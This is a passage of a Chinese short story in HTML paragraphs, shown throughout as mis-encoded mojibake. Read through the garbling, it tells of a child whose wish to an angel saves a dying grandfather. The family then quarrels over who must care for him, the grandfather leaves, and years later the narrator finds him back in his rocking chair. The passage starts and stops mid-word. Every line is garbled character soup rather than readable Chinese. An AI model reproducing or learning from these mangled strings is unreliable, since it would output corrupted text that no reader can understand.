·ï¼›ä»–çš„çœ¼ç´§é—­ç€ï¼Œä¼¼ä¹æ²¡æœ‰äº†å‘¼å¸ã€‚æˆ‘å‘ç–¯ä¼¼çš„æœä»–è·‘å»ï¼Œæ‘¸ä»–çš„æ‰‹ï¼Œæ‘¸ä»–çš„è„¸ï¼Œå˜´ä¸Šé‡å¤ç€â€œçˆ·çˆ·ï¼Œæˆ‘æ€•â€ã€‚æˆ‘å¤šä¹ˆå¸Œæœ›ä»–èƒ½åèµ·æ¥ï¼Œæ“¦æ‰æˆ‘çš„çœ¼æ³ªï¼Œè¯´ä¸€å¥â€œå‚»å­©å­ï¼Œå“­ä»€ä¹ˆï¼Œä¸€åˆ‡éƒ½ä¼šè¿‡å»çš„â€ã€‚å¯æ˜¯ï¼Œå¥‡è¿¹æ²¡èƒ½å‘ç”Ÿã€‚ä»–å°±èººåœ¨é‚£é‡Œï¼Œå®‰é™è€Œåˆç»æƒ…ã€‚</p><p>æˆ‘ä¸çŸ¥é“è‡ªå·±å“­äº†å¤šä¹…ã€‚å›åˆ°å®¶é‡Œæˆ‘åœ¨å“­ï¼Œä¸ŠåºŠç¡è§‰æ—¶æˆ‘è¿˜åœ¨å“­ã€‚æˆ‘ä¸€è¾¹å“­ç€ä¸€è¾¹è¿·è¿·ç³Šç³Šåœ°ç¡å»ï¼Œè¢«æ¢¦é‡Œå¯æ€•çš„åœºæ™¯å“é†’ä»¥åçˆ¬èµ·æ¥ç»§ç»­å“­ã€‚æ•å¤´æ¹¿å¾—ç¡ä¸ç€è§‰ï¼Œæˆ‘å°±ç›´æ„£æ„£åœ°æœ›ç€çª—å¤–ï¼Œå£°éŸ³å˜¶å“‘ã€‚çª—å¸˜æ²¡æ‹‰ï¼Œæˆ¿é—´è¢«æœˆå…‰é“ºæ»¡ã€‚</p><p>ä»Šå¤©çš„æœˆå¼‚å¸¸çš„åœ†ã€å¼‚å¸¸çš„äº®ï¼Œä½†åœ¨å¤§å¤§çš„ç™½ç‰ç›˜ä¸­å¤®æœ‰ä¸€ä¸ªçªå…€çš„å°é»‘ç‚¹ã€‚é‚£åƒæ˜¯ä¸€åªè™«å­ï¼Œæœ‰ä¸€åŒç¿…è†€ï¼Œåœ¨æœˆå…‰æ²³ä¸­å¿½ä¸Šå¿½ä¸‹åœ°é£ç€ã€‚ç­‰å®ƒé£è¿‘ä»¥åï¼Œæˆ‘æ‰ä¾ç¨€åœ°åˆ†è¾¨å‡ºï¼Œé‚£ä¸æ˜¯ä¸€åªé£è™«ï¼Œé‚£æ˜¯ä¸€ä¸ªäººï¼Œä¸€ä¸ªå¤©ä½¿ã€‚</p><p>â€œå¯æ€œçš„å­©å­ã€‚â€å¥¹åœ¨æˆ‘é¢å‰ç«™å®šï¼Œä¸€è„¸æ€œæ‚¯åœ°æœ›ç€æˆ‘ã€‚å¥¹çš„å‡ºç°å¹¶æ²¡æœ‰ç»™æˆ‘å¸¦æ¥å¤ªå¤§çš„æƒŠè®¶ã€‚å°å­©å­æ•é”çš„ç›´è§‰å‘Šè¯‰æˆ‘ï¼Œè¿™ä¸€åˆ‡éƒ½æ˜¯å‘½ä¸­æ³¨å®šçš„ã€‚</p><p>â€œæ•‘æ•‘æˆ‘ï¼Œæ•‘æ•‘æˆ‘çš„çˆ·çˆ·ã€‚â€æˆ‘å–ƒå–ƒç€ã€‚</p><p>å¥¹é‚£æ…ˆç¥¥çš„è„¸åºä¸Šæµ®ç°ä¸€æŠ¹å¾®ç¬‘ï¼šâ€œä½ ä¸ºä»€ä¹ˆç›¸ä¿¡æˆ‘èƒ½æ•‘ä½ çš„çˆ·çˆ·ï¼Ÿä½ å°±ä¸é—®é—®æˆ‘æ˜¯è°å—ï¼Ÿâ€</p><p>â€œæˆ‘çŸ¥é“çš„ï¼Œä½ æ˜¯å¤©ä½¿ã€‚â€œæˆ‘ç¬ƒå®šé“ã€‚å¥¹çœ‹ç€æˆ‘ï¼Œæ²¡æœ‰å¦è®¤ã€‚</p><p>â€œä½ ä¸€å®šèƒ½æ•‘æˆ‘çš„çˆ·çˆ·ï¼Œå¯¹å—ï¼Ÿâ€</p><p>å¥¹æ²‰é»˜ç€ã€‚</p><p>â€œè®©æˆ‘çš„çˆ·çˆ·æ´»ä¸‹å»ï¼Œâ€æˆ‘çªç„¶æŠ“ä½å¥¹çš„æ‰‹è‡‚ï¼Œå†ä¹ŸæŠ‘åˆ¶ä¸ä½åœ°å“½å’½ç€ï¼Œâ€œæˆ‘ä¸æƒ³è®©ä»–ç¦»å¼€æˆ‘ï¼â€</p><p>â€œå¥½å§ã€‚â€å¥¹æ€œæ‚¯è€Œåˆæ— å¥ˆåœ°ç¬‘äº†ç¬‘ï¼Œâ€œæˆ‘èƒ½æ»¡è¶³ä½ çš„æ„¿æœ›ã€‚ä½ çš„çˆ·çˆ·å†ä¹Ÿä¸ä¼šç¦»å¼€äº†ã€‚å¯æˆ‘è¦æé†’ä½ çš„æ˜¯ï¼Œæœ‰æ—¶å€™ï¼Œæ­»äº¡æ‰æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚â€</p><p>â€œå¦‚æœä½ ä»¥ååæ‚”äº†ï¼Œå°±æ¥æ‰¾æˆ‘å§ã€‚æˆ‘å°±ä½åœ¨ä½ çš„æ¢¦é‡Œã€‚â€</p><p>å¤©äº®äº†ï¼Œé˜³å…‰æ´’äº†è¿›æ¥ï¼Œæˆ‘èººåœ¨åºŠä¸Šï¼Œæ„Ÿè§‰è¿™ä¸€åˆ‡å°±æ˜¯ä¸ªæ¢¦ã€‚å¯æˆ‘åˆä¸æ„¿ç›¸ä¿¡è¿™æ˜¯ä¸ªæ¢¦ã€‚çˆ¶æ¯å’Œå§‘å§‘å¸¦ç€æˆ‘èµ°å‘åŒ»é™¢çš„æ—¶å€™ï¼Œæˆ‘çš„å¿ƒé‡Œåœ¨æ‰“é¼“ã€‚æœ‰æ—¶å€™æˆ‘èµ°å¾—å¿«äº›ï¼Œå¸Œæœ›èƒ½æ—©ç‚¹çœ‹åˆ°çˆ·çˆ·ç”Ÿé¾™æ´»è™åœ°ç«™åœ¨åŒ»é™¢è¿æ¥æˆ‘ä»¬ï¼›æœ‰æ—¶å€™æˆ‘è¿ˆä¸åŠ¨æ­¥å­ï¼Œå®³æ€•èµ¶åˆ°æˆ¿é—´é‡Œï¼Œçœ‹åˆ°çš„åªæ˜¯ä¸€å…·å†°å†·çš„å°¸ä½“ã€‚æˆ‘å°±è¿™æ ·èµ°èµ°åœåœï¼Œå¤§äººä»¬ä¹Ÿä¸ç®¡æˆ‘ã€‚ä»–ä»¬ä½ç€å¤´ï¼Œè‡ªé¡¾è‡ªçš„å¾€å‰èµ°ã€‚</p><p>æˆ‘ä»¬èµ°è¿‡äº†ä¸‰æ¡è¡—ï¼Œæˆ‘ä»¬ç©¿è¿‡äº†æœ€åä¸€æ¡é©¬è·¯ã€‚æˆ‘ä»¬èµ°è¿‡äº†æ±½è½¦æ æ†ã€‚å››ä¸ªç©¿é»‘è‰²å­æœçš„äººé—¯è¿›äº†åŒ»é™¢çš„å¤§é—¨ã€‚çˆ¶æ¯ä»ä½ç€å¤´ï¼Œå¹ç€æ°”ï¼›å§‘å§‘å¼€å§‹é…é…¿çœ¼æ³ªï¼Œæ°´ç åœ¨çœ¼çœ¶è¾¹æ‰“è½¬ï¼›è€Œæˆ‘åšå¥½äº†æœ€åçš„å‡†å¤‡ã€‚çˆ·çˆ·çš„æ£ºæå·²ç»åœ¨å®¶é‡Œèººç€äº†ã€‚</p><p>åŒ»é™¢é‡Œçš„ä¸€åˆ‡éƒ½åœ¨æœ‰æ¡ä¸ç´Šåœ°è¿›è¡Œç€ã€‚å‡ å¼ ç§»åŠ¨ç—…åºŠè¢«æ¨æ¥æ¨å»ï¼Œä¸€è¡Œäººåœ¨æŸœå°å‰å–è¯ï¼ŒæŠ¤å£«ä»¬åœ¨ç—…æˆ¿é—¨å‰èŠç€å¤©ã€‚æˆ‘ä»¬å¥½ä¸å®¹æ˜“æ‰¾åˆ°äº†çˆ·çˆ·çš„ç—…æˆ¿ï¼Œæ­£è¦æ•²é—¨ä¹‹æ—¶ï¼Œé—¨å¼€äº†ã€‚</p><p>æˆ¿é—´é‡Œé¢ç«™æ»¡äº†åŒ»ç”Ÿï¼Œçº¦è«æœ‰åæ¥ä¸ªã€‚å‡ ä¸ªäººåœ¨ç–¯ç‹‚æ‘†å¼„ç€ä»ªå™¨ï¼Œç¥è‰²æœ‰äº›ç‹°ç‹ã€‚é‚£ä¸ªå¼€é—¨çš„åŒ»ç”Ÿèµ°äº†å‡ºæ¥ï¼Œè„¸ä¸Šå†™æ»¡äº†æƒŠè®¶ã€‚â€œå¥‡è¿¹ï¼ŒçœŸæ˜¯ä¸ªå¥‡è¿¹ã€‚â€ä»–è‡ªè¯­ç€ï¼Œæ²‰æµ¸åœ¨è‡ªå·±çš„ä¸–ç•Œé‡Œï¼ŒæŠŠé—¨å…³ä¸Šåå°±å¾€å¤–èµ°ï¼Œç”šè‡³éƒ½æ²¡æ³¨æ„åˆ°é—¨å£ç«™ç€çš„å››ä¸ªå¯æ€œäººã€‚</p><p>å§‘å§‘å¥½ä¸å®¹æ˜“å«ä½äº†ä»–ï¼Œè¯¢é—®ä»–é‡Œé¢çš„æƒ…å†µï¼Œè€Œä»–çš„è¯éœ‡æƒŠäº†é™¤äº†æˆ‘ä»¥å¤–çš„å…¶ä»–ä¸‰ä¸ªäººã€‚</p><p>â€œæ´»ä¸‹æ¥äº†â€¦â€¦æ­»æ°”å…¨æ— â€¦â€¦è‚ç™Œç»†èƒè¢«æ¸…é™¤â€¦â€¦ç”šè‡³èƒ½ä¸‹åºŠèµ°è·¯äº†â€¦â€¦â€å§‘å§‘é‡å¤ç€ä»–è¯´çš„è¯ï¼ŒåŒç›®å‘†æ»ï¼Œæ˜¾ç„¶æ˜¯è¢«è¿™çªå‡ºå…¶æ¥çš„æ¶ˆæ¯å“åäº†ã€‚</p><p>çˆ·çˆ·è¿˜æ´»ç€ã€‚å¬åˆ°è¿™é‡Œï¼Œä¸€è‚¡ç‚½çƒ­çš„æ°”æµä»å¿ƒå¤´å‡èµ·ï¼Œå¥”è…¾ç€æ¶Œè¿›æˆ‘çš„å¤§è„‘ã€‚â€œå¤ªæ£’äº†ï¼â€æˆ‘å¤§å«ä¸€å£°ï¼Œæ’’å¼€åŒè…¿å°±å¾€åŒ»é™¢å¤§é—¨è·‘å»ã€‚æˆ‘ä¸çŸ¥é“æœ‰å¤šå°‘äººå›å¤´çœ‹æˆ‘ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“è‡ªå·±æ’å€’äº†å¤šå°‘ä¸ªäººï¼Œå¬åˆ°äº†å¤šå°‘å¥â€œçœ‹ç€ç‚¹è·¯ï¼Œå°å±å­©â€ï¼Œæˆ‘åªçŸ¥é“åœ¨è¿™ä¸€åˆ»æˆ‘è¦é€ƒå‡ºè¿™ä¸ªå‹æŠ‘çš„åœ°æ–¹ï¼Œå»å‘¼å¸å¤–é¢æ–°é²œçš„ç©ºæ°”ã€‚æˆ‘å†²è¿‡äº†æ±½è½¦æ æ†ï¼Œå†²è¿‡äº†é©¬è·¯ï¼Œå†²è¿›äº†å¯¹é¢çš„èŠ±å›­ã€‚ä»çŒæœ¨ä¸›é‡Œé£å‡ºçš„éº»é›€æ‰‘åˆ°æˆ‘çš„è„¸ä¸Šï¼Œæˆ‘æ€ç¿»äº†é©¬èœ‚çªï¼Œä¸€ç¾¤èœœèœ‚åœ¨æˆ‘å±è‚¡åé¢è¿½ç€è·‘ã€‚åœ¨è½¬è§’å¤„æœ‰ä¸€å›¢çƒ§å°½çš„æœ¨å±‘ï¼Œæˆ‘è¿˜èƒ½ä»ä¸­çœ‹åˆ°éšéšè·³åŠ¨çš„ç«å…‰ã€‚å“¦ï¼Œè¿™ä¸€åˆ‡æ˜¯å¤šä¹ˆä»¤äººç€è¿·å•Šï¼</p><p>ç­‰æˆ‘è¹¦ç€è·³ç€å›åˆ°ç—…æˆ¿çš„æ—¶å€™ï¼Œæˆ‘çš„å˜´è§’è¿˜æ˜¯æŠ‘åˆ¶ä¸ä½åœ°å‘ä¸Šæ‰¬ã€‚æˆ‘å®åœ¨æ˜¯å¤ªå¼€å¿ƒäº†ï¼Œä»¥è‡³äºä¸€å¼€å§‹éƒ½æ²¡æœ‰æ„Ÿè§‰åˆ°åœ¨ç—…æˆ¿å¤–ç«Ÿç¬¼ç½©ç€ä¸€ç§å‹æŠ‘çš„æ°”æ°›â€”â€”å§‘å§‘å’Œçˆ¶æ¯é¢å¯¹é¢åç€ï¼Œå››çœ¼å¯¹ç€ä¸¤çœ¼ï¼Œä¸€è¨€ä¸å‘ã€‚æˆ‘è¢«æ¯äº²æ‹‰åˆ°èº«è¾¹ï¼Œå¥¹ç”¨å¥¹é‚£ä¸¥è‚ƒè€Œå†°å†·çš„ç¥æƒ…æŠŠæˆ‘çš„å–œæ‚¦æµ‡ç­äº†ã€‚çœ‹æ ·å­ï¼Œä»–ä»¬æ—©å·²ä»å¬åˆ°æ¶ˆæ¯çš„éœ‡æƒŠä¸­èµ°äº†å‡ºæ¥ã€‚</p><p>å¤§äººä»¬çœŸçš„æ˜¯ä¸€ç§å¥‡æ€ªçš„ç”Ÿç‰©ï¼Œä½ æ°¸è¿œä¹Ÿä¸çŸ¥é“ä»–ä»¬è„‘å­é‡Œè£…ç€äº›ä»€ä¹ˆã€‚çˆ·çˆ·æ´»ç€æ˜æ˜æ˜¯ä¸€ä»¶å€¼å¾—é«˜å…´çš„äº‹ï¼Œå¯ä»–ä»¬çš„ç¥è‰²çœ‹èµ·æ¥æ¯”çˆ·çˆ·æ­»äº†è¿˜è¦éš¾çœ‹ã€‚éš¾çœ‹ä¹Ÿå°±ç®—äº†ï¼Œä½†ä»–ä»¬éè¦æŠŠä¸å¼€å¿ƒåŸ‹åœ¨å¿ƒé‡Œï¼Œä¹Ÿä¸è¯´å‡ºæ¥ï¼Œè‡ªé¡¾è‡ªåœ°ç”Ÿç€é—·æ°”ã€‚ä½œå°å­©å­çš„è¿˜ä¸èƒ½é—®è¿™æ˜¯æ€ä¹ˆå›äº‹ï¼Œä½ åªè¦ä¸€å¼€å£ï¼Œä»–ä»¬é‚£å†°å†·çš„ç›®å…‰å°±ä¼šé½åˆ·åˆ·åœ°æœä½ èº«ä¸Šæ±‡èšï¼Œè®©ä½ å°´å°¬å¾—æ¨ä¸å¾—æ‰¾ä¸ªæ´é’»è¿›å»ã€‚æ­¤æ—¶ï¼Œå§‘å§‘å’Œçˆ¶æ¯å°±å¥½åƒå¤§æˆ˜å‰å¯¹æˆ˜çš„ä¸¤æ–¹å†›å›¢ï¼Œè¿˜æœªæ“‚é¼“å´å·²åœ¨èšåŠ¿ï¼Œå”‡æªèˆŒæˆ˜å°šæœªå¼€å§‹ï¼Œå¦‚åˆ©å‰‘ä¹‹ç›®å…‰å´å·²è¿‡äº†åƒç™¾æ‹›ã€‚èµ°å»Šä¸Šå·²æ— å¤–äººï¼Œè¿›æ”»çš„å·è§’å³å°†å¹å“ï¼Œè€Œæˆ‘å°±æ˜¯é‚£ç«™åœ¨å†›å›¢é˜Ÿå°¾çš„ç‘Ÿç‘Ÿå‘æŠ–çš„é€ƒå…µï¼Œä¸€è¨€ä¸å‘è€Œåˆæˆ˜æˆ˜å…¢å…¢ã€‚</p><p>å§‘å§‘ç‡å…ˆæ‰“ç ´æ²‰é»˜ï¼Œå¥¹æœ‰ä¸€æ­æ²¡ä¸€æ­åœ°èŠç€å¤©æ°”ï¼Œæ¯äº²ä¹Ÿéšæ„åœ°åº”å’Œç€ã€‚å§‘å§‘ä¸è‡ªç„¶åœ°æ“ç€è‡ªå·±çš„åŒæ‰‹ï¼Œä¸æ—¶åœ°æŠ ç€æ‰‹æŒ‡ç”²ä¸Šçš„æ±¡å¢ã€‚æ¯äº²é¢‘ç¹åœ°æ•´ç†ç€è‡ªå·±çš„è¡£é¢†ï¼Œå¶å°”æŠŠå¤´è½¬å‘æˆ‘ï¼Œé—®æˆ‘åˆšæ‰å»å“ªäº†ã€å¹²ä»€ä¹ˆäº†ã€‚æˆ‘ä¸€ä¸€å›ç­”ç€ï¼Œå¯æˆ‘çŸ¥é“å¥¹ä¸åœ¨å¬ï¼Œå¥¹ä»¬çš„å¿ƒæ€å…¨åœ¨å¯¹æ–¹èº«ä¸Šã€‚å¥¹ä»¬ä¹‹é—´çš„å¯¹è¯æˆ‘å¬äº†å¥½ä¹…ï¼Œæ‰æ˜ç™½å¥¹ä»¬åœ¨ä¸ºçˆ·çˆ·ä»¥åä½è°å®¶è€Œäº‰æ‰§ä¸ä¼‘ã€‚</p><p>â€œå«‚å­å•Šï¼Œä½ ä»¬ç…§é¡¾çˆ¸åå‡ å¹´äº†ã€‚æˆ‘åœ¨è¿™æ–¹é¢æ²¡ç»éªŒã€‚æˆ‘è¦æ˜¯æ‹›å¾…ä¸å‘¨äº†ï¼Œä¸‡ä¸€æœ‰ä¸ªä¸‰é•¿ä¸¤çŸ­çš„ï¼Œåæ‚”ä¹Ÿæ¥ä¸åŠã€‚â€</p><p>â€œå°å§‘å­ï¼Œè¯ä¸èƒ½è¿™ä¹ˆè¯´ï¼Œä¸ä¼šå¯ä»¥å­¦å˜›ï¼å†µä¸”ï¼Œæˆ‘æ˜¯æ›¿ä½ ç€æƒ³ã€‚é‚»é‡Œå“ªä¸ªä¸å¯¹ä½ çš„ä¸å­æŒ‡æŒ‡ç‚¹ç‚¹ï¼Ÿè®©çˆ¸åœ¨ä½ é‚£ä½ä¸Šå‡ å¹´ï¼Œè¿™äº›æµè¨€è‡ªç„¶å°±æœ‰å¤šè¿œæ»šå¤šè¿œäº†ã€‚â€</p><p>â€œå­å¿ƒæˆ‘è‡ªå·±æ‡‚å°±è¡Œï¼ŒçŠ¯ä¸ç€åˆ«äººä¸ºæˆ‘æ‹…å¿ƒã€‚æˆ‘ä¸€ä¸ªäººè¿‡æƒ¯äº†â€¦â€¦â€</p><p>â€œâ€¦â€¦ä½ ä¸€ä¸ªäººï¼Œè‡ªç„¶æ–¹ä¾¿ã€‚æˆ‘ä»¬ç´¯æ­»ç´¯æ´»åœ°æŠŠæ¯›æ¯›å…»å¤§ï¼Œç°åœ¨ä»–çš„å­¦è´¹è¿˜æ²¡ç€è½å‘¢ï¼â€</p><p>å¯¹äºåŠ¿å‡åŠ›æ•Œçš„åŒæ–¹è€Œè¨€ï¼Œä»—åªä¼šè¶Šæ‰“è¶Šå‡¶ï¼Œä¸æ¯«æ²¡æœ‰åœæ­¢çš„æ¶åŠ¿ã€‚çˆ·çˆ·å°±åƒçŒ«çˆªä¸‹çš„ä¸€å›¢æ¯›çº¿ï¼Œè¢«æ— æƒ…åœ°æŠ›æ¥æŠ›å»ï¼Œä¸æ—¶çš„è¿˜è¢«äººå•ä¸Šä¸€å£å”¾æ²«ã€‚ç°åœ¨æˆ‘æ‰æ„è¯†åˆ°çˆ¶æ¯ä¸ºäº†å…»æˆ‘å’Œçˆ·çˆ·èƒŒè´Ÿäº†å¤šå¤§çš„è´£ä»»ã€‚æˆ‘è‡ªç„¶æ˜¯ç«™åœ¨æ¯äº²è¿™ä¸€è¾¹çš„ï¼Œå¯æˆ‘ä¸€æƒ³åˆ°é‚£èººåœ¨æ‘‡æ¤…ä¸Šå•è–„çš„èº«å½±è¦è¢«æˆ‘ä»¬èµ¶å‡ºé—¨å»ï¼Œæˆ‘åˆæ­¢ä¸ä½åœ°å¿ƒé…¸ã€‚</p><p>å¿ƒå¹³æ°”å’Œçš„è®¨è®ºï¼Œå˜æˆäº†å‰‘æ‹”å¼©å¼ çš„äº‰åµï¼Œæœ€ååˆä¸å¯é¿å…åœ°å˜æˆæ­‡æ–¯åº•é‡Œçš„å°–å«ã€‚æ¯äº²æ°”å¾—çœ¼ç å­éƒ½å¿«è¹¦å‡ºæ¥äº†ï¼Œå¥¹æŒ‡ç€å§‘å§‘çš„é£ŸæŒ‡åœ¨ç©ºä¸­ä¹±é¢¤ï¼šâ€œä½ ä¸ªæ²¡è‰¯å¿ƒçš„ç™½çœ¼ç‹¼ï¼ä¾æˆ‘çœ‹çˆ¸æ˜¯ä¸è¯¥ç”Ÿä½ ï¼â€</p><p>å§‘å§‘ä¹Ÿä¸ç”˜ç¤ºå¼±ï¼šâ€œä½ è¦æ˜¯ç¡¬æŠŠä»–å¡ç»™æˆ‘ï¼Œæˆ‘å°±è·Ÿä»–ä¸€åˆ€ä¸¤æ–­ï¼â€</p><p>åœ¨åˆ©ç›Šé¢å‰ï¼Œç¾è€»å¿ƒæ˜¯è¦è®©æ­¥çš„ã€‚èµ°å»Šä¸Šé€æ¸æŒ¤æ»¡äº†æ¥çœ‹çƒ­é—¹çš„äººï¼Œå¯å¥¹ä»¬å´ä¸æ¯«ä¸è§æ”¶æ•›ã€‚çœ¼è§ç€éŸ³è°ƒè¶Šæ¥è¶Šé«˜ï¼Œè¯­è¨€è¶Šæ¥è¶Šä¸å ªå…¥è€³ï¼Œé‚£ä¸ªä¸€ç›´è¢«å¿½è§†çš„ç—…æˆ¿é—¨å¼€äº†ï¼Œçˆ·çˆ·èµ°äº†å‡ºæ¥ã€‚å°–å«å£°æˆ›ç„¶è€Œæ­¢ã€‚</p><p>é‚£å¼ è„¸å·²ä¸å†æ…ˆç¥¥ã€‚å®ƒä¸Šé¢å†™æ»¡äº†ç¾æ„§ã€æ‡Šæ‚”ã€é—æ†¾ä¸æ— å¥ˆçš„å­—æ ·ï¼›è„ŠèƒŒæŒºå¾—ç¬”ç›´ï¼Œä½†ä¹Ÿå¼±ä¸ç¦é£ï¼›é‚£è‹ç™½çš„å¤´å‘åœ¨ç©ºä¸­æ‘†åŠ¨ï¼Œå®ƒä¼¼ä¹å˜å¾—æ›´ç™½äº†ã€‚å¤©ä½¿çš„é­”åŠ›èµ‹äºˆäº†ä»–åŠ›é‡ï¼Œè®©ä»–çœ‹èµ·æ¥åƒæ˜¯å¹´è½»äº†åå²ã€‚å¯æˆ‘åˆä¸å¯é¿å…åœ°æ„è¯†åˆ°ï¼Œæ­¤åˆ»çš„ä»–æ¯”å¹³å¸¸ä»»ä½•æ—¶å€™éƒ½è¦ç–²æƒ«ï¼Œéƒ½è¦è¡°è€ã€‚</p><p>æˆ‘çš„è„šæ­¥ä¸ç”±è‡ªä¸»åœ°å‘å‰è·¨å»ï¼Œå´è¢«æˆ‘çˆ¸æ‹‰äº†å›æ¥ã€‚çˆ·çˆ·è½¬è¿‡å¤´æ¥ï¼Œä»–é‚£æ¨¡ç³Šä¸æ¸…çš„çœ¼ç¥åœ¨æˆ‘èº«ä¸Šåœç•™ã€‚æˆ‘ä¸æ•¢ç›´è§†ä»–ã€‚è®¸ä¹…ï¼Œä»–ç§»å¼€äº†è§†çº¿ï¼Œè¸ç€é“¿é”µçš„æ­¥ä¼æœåŒ»é™¢å¤§é—¨èµ°å»ã€‚</p><p>ä»–è¦ç¦»å¼€ã€‚ä»–è¦å»å“ªï¼Ÿ</p><p>æˆ‘ä»¬å››äººéƒ½ä¸çº¦è€ŒåŒåœ°è¿ˆå‡ºæ­¥å­ï¼Œè·Ÿåœ¨ä»–åé¢ã€‚è¿™æ—¶ä»–åœä¸‹äº†ï¼Œç”©ä¸‹ä¸€å¥è¯ã€‚</p><p>ä½ ä»¬è‡ªå·±å¿™è‡ªå·±çš„ï¼Œä¸è¦ç®¡æˆ‘ã€‚</p><p>ä»–èµ°äº†ï¼Œæˆ‘åœ¨ä»–è¸±æ­¥ç¦»å»çš„èº«å½±ä¸­çœ‹åˆ°äº†è½å¯ã€‚çˆ¸çˆ¸å¼ äº†å¼ å˜´æƒ³è¦è¯´ä¸€å¥æŒ½ç•™çš„è¯ï¼Œå¯ä»–æœ€åè¿˜æ˜¯ä»€ä¹ˆéƒ½æ²¡è¯´ã€‚æ¯äº²å’Œå§‘å§‘å€’æ˜¯è§£è„±èˆ¬åœ°å‘¼å‡ºä¸€å£æµŠæ°”ï¼Œåè€…ä»è¡£å…œé‡Œæ‹½å‡ºå‡ å¼ å·²ç»æ’•ç¢çš„çº¸ç‰‡ï¼Œä¸€è„¸é—æ†¾åœ°æŠŠå®ƒä»¬ä¸¢è¿›äº†åƒåœ¾æ¡¶ã€‚</p><p>çˆ·çˆ·æ´»ç€ï¼Œä½†ä»–è¿˜æ˜¯ç¦»å¼€äº†æˆ‘ã€‚æˆ‘è¿™æ‰ä»èƒœåˆ©çš„è¿·æƒ˜ä¸­æ¸…é†’è¿‡æ¥ã€‚æ‚²ç—›èµ‹äºˆäº†æˆ‘ä»¬åæ€çš„æƒåŠ›ã€‚æˆ‘å›æƒ³èµ·å¤©ä½¿è¯´çš„é‚£å‡ å¥è¯ï¼Œâ€œæ­»äº¡æ‰æ˜¯æœ€å¥½çš„é€‰æ‹©â€æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿéš¾é“è¯´ï¼Œçˆ·çˆ·å¦‚ä»Šå‡ºèµ°ï¼Œæ˜¯ä»–æ´»ç€çš„å¿…ç„¶åæœå—ï¼Ÿ</p><p>å›åˆ°å®¶ï¼Œçˆ¶æ¯æœ›ç€å®¢å…é‚£å£æ£ºæï¼Œé™·å…¥äº†æ²‰æ€ã€‚å§‘å§‘æ”¶æ‹¾ä¸œè¥¿èµ°äº†ã€‚å§‘å§‘åŸæœ¬æ˜¯å¤šä¹ˆä¹è§‚çš„äººå•Šï¼Œçˆ·çˆ·é‡ç—…æœŸé—´å¥¹è¿˜èƒ½å¯¹ç€ä¸€å¼ é—äº§è½¬è®©ä¹¦ç¬‘ï¼Œå¯ä»Šå¤©è¿™ä¹ˆä¸€é—¹ï¼Œå¥¹ç›´æ¥åœ¨ç—…æˆ¿å¤–æŠŠé‚£å¼ çº¸æ’•äº†ã€‚çˆ·çˆ·æ´»ç€ä¸åº”è¯¥æ˜¯å€¼å¾—é«˜å…´çš„äº‹å—ï¼Ÿé‚£å¥¹ä»¬å»å¯ºåº™æ‹œä½›çƒ§é¦™ç¥ˆçš„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘æ„Ÿè§‰è¿™ä¸€åˆ‡å®åœ¨æ˜¯å¤ªè¿‡æ™¦æ¶©éš¾æ‡‚äº†ã€‚</p><p>æˆ‘ç«™åœ¨é™¢å­é‡Œï¼Œç©ºè½è½åœ°æœ›ç€çˆ·çˆ·çš„æˆ¿é—´ã€‚æˆ‘è¯•ç€å¹»æƒ³çˆ·çˆ·ç¦»å¼€æˆ‘ä»¬åä¼šè¿‡æ€æ ·çš„ç”Ÿæ´»ï¼Œå¯æ˜¯å°å‡åˆçš„å­¦ä¸šå‹åŠ›ä¸çˆ¶æ¯çš„æœŸæœ›è¿«ä½¿æˆ‘æ”¾å¼ƒè¿™ç§æ— æ„ä¹‰çš„æ€è€ƒã€‚æœ‰æ—¶å€™ï¼Œæˆ‘æ³¨æ„åˆ°å¢™è¾¹å€’ä¸‹çš„é“é”¹ï¼Œä¼šæƒ³èµ·é‚£äº›æ— å¿§æ— è™‘çš„ä¸‹åˆï¼Œçˆ·çˆ·æƒ³æ‰“åˆä¸å¿å¿ƒæ‰“æˆ‘çš„æ¨¡æ ·ï¼›å¯å¤§å¤šæ—¶å€™ï¼Œæˆ‘ä¼šå¿˜äº†åœ¨æˆ‘ä»¬å®¶é‡Œï¼Œè¿˜æ›¾æœ‰è¿‡è¿™æ ·ä¸€ä½â€œå®¢äººâ€ã€‚</p><p>éƒ½è¯´æ—¶é—´æ˜¯æ²»æ„ˆä¼¤ç—›çš„è‰¯è¯ï¼Œæˆ‘ä¹Ÿæ¸æ¸é€‚åº”äº†æ²¡æœ‰çˆ·çˆ·çš„ç”Ÿæ´»ã€‚çˆ¶æ¯æ‰˜äº†å…³ç³»ï¼Œè®©æˆ‘å»å¼‚åœ°çš„åˆä¸­è¯»ä¹¦ï¼Œè¿™ä¸€å»å°±æ˜¯ä¸‰å¹´ã€‚ä¸€ä¸ªäººçš„ç”Ÿæ´»ä¹Ÿè®©æˆ‘å®Œæˆäº†èœ•å˜ï¼ŒæŒ¤å…¥â€œå°å¤§äººâ€çš„è¡Œåˆ—ã€‚å½“æˆ‘æ‹–ç€è¡Œæç®±å’Œç–²æƒ«çš„èº«èº¯å›åˆ°å®¶æ—¶ï¼Œè¿™ç§è½å¶å½’æ ¹çš„æ„Ÿè§‰è®©æˆ‘å¤„äºåŸå¸‚å–§åš£ä¸­çš„èºåŠ¨ä¹Ÿå®‰é™äº†ä¸‹æ¥ã€‚</p><p>æ¨å¼€é—¨ï¼Œçˆ¶æ¯ä¸åœ¨ï¼Œä½†çˆ·çˆ·æˆ¿é—´çš„é—¨è™šæ©ç€ã€‚æˆ‘æ”¾ä¸‹è¡Œæï¼Œè„±ä¸‹å¤–å¥—ï¼Œä¼¸æ‰‹é¡¶å¼€çˆ·çˆ·æˆ¿é—´çš„é—¨çš„æ—¶å€™ï¼Œæˆ‘çœ‹è§äº†ä¸‰å¹´å‰çš„é‚£ä¸€å¹•â€”â€”</p><p>çˆ·çˆ·é åœ¨æ‘‡æ¤…ä¸Šï¼Œæ‘‡æ¤…å‰åæ‘†åŠ¨ï¼Œå’¯å±å’¯å±åœ°å“ç€ã€‚ä»–æœ›ç€çª—å¤–ï¼Œä¸æ¯«æ²¡æœ‰æ„Ÿè§‰åˆ°æˆ‘çš„åˆ°æ¥ã€‚æ¡Œä¸Šæ”¾ç€ä¸€æœ¬ã€Šå”è¯—é‰´èµè¯å…¸ã€‹ï¼Œä¸€åŒ…é¢å·¾çº¸ï¼Œä¸€ç½æ£‰ç­¾ã€‚é™¢å­é‡Œå¾®é£å¾å¾ï¼Œé“é”¹é 